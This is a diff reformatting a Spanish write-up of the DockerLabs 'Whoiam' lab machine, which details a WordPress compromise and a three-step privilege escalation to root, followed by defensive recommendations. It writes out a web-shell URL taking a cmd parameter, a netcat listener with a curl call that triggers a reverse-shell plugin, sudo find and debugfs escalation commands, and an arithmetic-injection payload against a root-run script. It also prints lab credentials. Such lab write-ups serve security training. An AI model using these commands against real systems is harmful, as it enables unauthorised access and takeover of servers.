@@ -1,20 +1,6 @@
----
-título: DockerLabs - Whoiam
-fecha: 2026-09-30
-plataforma: DockerLabs
-dificultad: Fácil
-sistema: Linux
-ip: 172.18.0.2
-estado: completado
-etiquetas:
-  - ctf
-  - writeup
-  - dockerlabs
----
 # DockerLabs - Whoiam
 
-> [!abstract] Resumen
-> La máquina expone un servidor web WordPress. Mediante fuzzing de directorios se localiza un backup con credenciales válidas del usuario `developer`. Tras acceder al panel de administración, se aprovecha la funcionalidad de subida de plugins para desplegar un plugin malicioso que otorga ejecución remota de comandos. La escalada de privilegios se realiza en tres etapas: primero a `rafa` mediante `sudo find`, luego a `ruben` con `debugfs`, y finalmente a `root` explotando una inyección de comandos en el script `/opt/penguin.sh`.
+**Resumen:** La máquina expone un servidor web WordPress. Mediante fuzzing de directorios se localiza un backup con credenciales válidas del usuario `developer`. Tras acceder al panel de administración, se aprovecha la funcionalidad de subida de plugins para desplegar un plugin malicioso que otorga ejecución remota de comandos. La escalada de privilegios se realiza en tres etapas: primero a `rafa` mediante `sudo find`, luego a `ruben` con `debugfs`, y finalmente a `root` explotando una inyección de comandos en el script `/opt/penguin.sh`.
 
 ## Información de la Máquina
 
@@ -33,11 +19,11 @@ etiquetas:
 
 Se verificó la conectividad con el objetivo y, acto seguido, se ejecutó `nmap` para identificar los puertos abiertos.
 
-![[Pasted image 20260928200059.png]]
+![Escaneo inicial](assets/Pasted%20image%2020260928200059.png)
 
 Se identificó el puerto 80, por lo que se procedió a inspeccionar el servicio web.
 
-![[Pasted image 20260928200124.png]]
+![Servicio web](assets/Pasted%20image%2020260928200124.png)
 
 ### Fuzzing de directorios
 
@@ -49,7 +35,7 @@ gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/common.txt -x php
 
 **Resultado:**
 
-![[Pasted image 20260928200319.png]]
+![Fuzzing de directorios](assets/Pasted%20image%2020260928200319.png)
 
 Se accedió a `/license.txt`, que únicamente contenía el texto por defecto generado por WordPress al ser levantado.
 
@@ -57,47 +43,48 @@ Se accedió a `/license.txt`, que únicamente contenía el texto por defecto gen
 
 Al ingresar a `/wp-admin` se visualizó el panel de inicio de sesión de WordPress. Se intentó el acceso con credenciales por defecto pero no hubo resultado.
 
-![[Pasted image 20260928200554.png|688]]
+![Login de WordPress](assets/Pasted%20image%2020260928200554.png)
 
 En `/includes` se observó lo siguiente:
 
-![[Pasted image 20260928201519.png]]
+![Directorio includes](assets/Pasted%20image%2020260928201519.png)
 
 Posteriormente, se exploró el directorio `Backups` y se halló:
 
-![[Pasted image 20260929200843.png]]
+![Directorio Backups](assets/Pasted%20image%2020260929200843.png)
 
 Al descomprimir el archivo `.zip`, se obtuvo:
 
-![[Pasted image 20260928211317.png]]
+![Contenido del zip](assets/Pasted%20image%2020260928211317.png)
 
 | Usuario | Contraseña |
 | :--- | :--- |
 | developer | 2wmy3KrGDRD%RsA7Ty5n71L^ |
 
 ---
+
 ## Acceso Inicial
 
 Se probaron las credenciales obtenidas y se logró el acceso:
 
-![[Pasted image 20260928212102.png]]
+![Acceso al panel](assets/Pasted%20image%2020260928212102.png)
 
 Para mayor comodidad, se creó un usuario con permisos de administrador.
 
 - **Usuario:** `hacking`
 - **Contraseña:** `P$pDWX5KA#@uQrr83z1O9ADi`
 
-> [!warning] Vulnerabilidad
-> **Tipo:** Subida de archivos arbitrarios (plugin malicioso en WordPress)
-> **Endpoint / Servicio:** Panel de administración de WordPress (`/wp-admin`)
+**Vulnerabilidad**
+- **Tipo:** Subida de archivos arbitrarios (plugin malicioso en WordPress)
+- **Endpoint / Servicio:** Panel de administración de WordPress (`/wp-admin`)
 
-![](Pasted%20image%2020261003144111.png)
+![Subida de plugin](assets/Pasted%20image%2020261003144111.png)
 
 Se identificó la posibilidad de subir plugins en formato `.zip`. Aprovechando esta funcionalidad, se creó un archivo PHP malicioso dentro de una carpeta llamada `mi-plugin`, se comprimió con `zip -r mi-plugin.zip mi-plugin` y se subió como plugin. Una vez instalado, se accedió a la siguiente URL para ejecutar comandos:
 
 `http://172.18.0.2/wp-content/plugins/mi-plugin/shell.php?cmd=sudo%20-l`
 
-![[Pasted image 20260928222134.png]]
+![Ejecución de comandos](assets/Pasted%20image%2020260928222134.png)
 
 **Contenido del `.php` que va dentro del `mi-plugin`:**
 
@@ -158,21 +145,24 @@ function executeCommand(string $command): void
 ---
 
 A continuación, se inició un listener con `netcat` en el puerto 4444 y, en otra terminal, se ejecutó:
+
 ```bash
 nc -lvnp 4444
 ```
 
 Realizado el comando anterior, procedemos a abrir una shell paralela y ponemos el siguiente comando.
+
 ```bash
 curl -v --get --data-urlencode "ip=172.18.0.2" --data-urlencode "port=4444" "http://172.18.0.2//wp-content/plugins/shell2/shell2.php"
 ```
 
 ---
+
 ## Shell como www-data
 
 Se ejecutó `sudo -l` y se obtuvo:
 
-![[Pasted image 20260928224521.png]]
+![sudo -l www-data](assets/Pasted%20image%2020260928224521.png)
 
 ---
 
@@ -188,11 +178,11 @@ sudo -u rafa find . -exec /bin/sh \; -quit
 
 Resultado:
 
-![[Pasted image 20260930184324.png]]
+![Escalada a rafa](assets/Pasted%20image%2020260930184324.png)
 
 Una vez dentro, se enumeraron los permisos de `rafa` y se buscaron otros usuarios para continuar la escalada.
 
-![[Pasted image 20260930184529.png]]
+![Enumeración rafa](assets/Pasted%20image%2020260930184529.png)
 
 ### Escalada a ruben
 
@@ -202,17 +192,17 @@ Se utilizó `debugfs` con permisos de `sudo` para escalar a `ruben`:
 sudo -u ruben debugfs
 ```
 
-![[Pasted image 20260930184548.png]]
+![Escalada a ruben](assets/Pasted%20image%2020260930184548.png)
 
 Dentro de la sesión, se verificó con `sudo -l` que `ruben` podía ejecutar un script `.sh` con `/bin/bash` ubicado en `/opt`.
 
-![[Pasted image 20260930184745.png]]
+![Permisos ruben](assets/Pasted%20image%2020260930184745.png)
 
 ### Escalada a root
 
 Se accedió al directorio y se inspeccionó el contenido del script con `cat`. El script validaba que la variable `$num` fuera igual a `42`. Tras varias pruebas, se observó que aceptaba expresiones como `a+42` y devolvía "Correct". Aprovechando esta validación, se buscó un comando que, al ser evaluado, permitiera obtener una shell de bash.
 
-![[Pasted image 20260928230538.png]]
+![Script penguin.sh](assets/Pasted%20image%2020260928230538.png)
 
 Finalmente, se ejecutó el script como root:
 
@@ -228,24 +218,23 @@ a[$(/bin/bash>&2)]+42
 
 Como resultado, se obtuvo una shell como `root`, finalizando la máquina.
 
-![[Pasted image 20260928235535.png]]
+![Root obtenido](assets/Pasted%20image%2020260928235535.png)
 
 ---
 
 ## Más Allá de Root
 
-> [!quote] Análisis Post-Explotación
-> - **Lo que funcionó:** La subida de plugins maliciosos en WordPress para obtener ejecución remota de comandos, y el encadenamiento de `sudo` con binarios inusuales (`find`, `debugfs`).
-> - **Lo que falló:** Los intentos iniciales con credenciales por defecto en el login de WordPress.
-> - **Herramientas nuevas:** Uso de `debugfs` para escalar privilegios a otro usuario.
-> - **Para la próxima:** Automatizar la creación y subida de plugins maliciosos para agilizar la fase de foothold en WordPress.
+**Análisis Post-Explotación**
+- **Lo que funcionó:** La subida de plugins maliciosos en WordPress para obtener ejecución remota de comandos, y el encadenamiento de `sudo` con binarios inusuales (`find`, `debugfs`).
+- **Lo que falló:** Los intentos iniciales con credenciales por defecto en el login de WordPress.
+- **Herramientas nuevas:** Uso de `debugfs` para escalar privilegios a otro usuario.
+- **Para la próxima:** Automatizar la creación y subida de plugins maliciosos para agilizar la fase de foothold en WordPress.
 
 ---
 
 ## Mitigación
 
-> [!shield] Recomendaciones Defensivas
-> A continuación se detallan las contramedidas recomendadas para cada vulnerabilidad identificada durante la auditoría, ordenadas según la fase del ataque en la que fueron explotadas.
+Contramedidas recomendadas para cada vulnerabilidad identificada durante la auditoría, ordenadas según la fase del ataque en la que fueron explotadas.
 
 ### Exposición de credenciales en backups
 
@@ -298,8 +287,7 @@ Como resultado, se obtuvo una shell como `root`, finalizando la máquina.
 - En Bash, citar siempre las variables (`"$num"`) y usar `[[ ]]` en lugar de `[ ]` para comparaciones más seguras.
 - Implementar revisión de código para scripts con `sudo` y aplicar herramientas de análisis estático (ShellCheck).
 
-> [!tip] Defensa en Profundidad
-> Ninguna de estas mitigaciones es efectiva de forma aislada. La combinación de controles preventivos (mínimo privilegio, sanitización), detectivos (WAF, monitoreo de integridad) y correctivos (rotación de credenciales, parcheo) es lo que realmente reduce la superficie de ataque.
+**Defensa en Profundidad:** Ninguna de estas mitigaciones es efectiva de forma aislada. La combinación de controles preventivos (mínimo privilegio, sanitización), detectivos (WAF, monitoreo de integridad) y correctivos (rotación de credenciales, parcheo) es lo que realmente reduce la superficie de ataque.
 
 ---
 
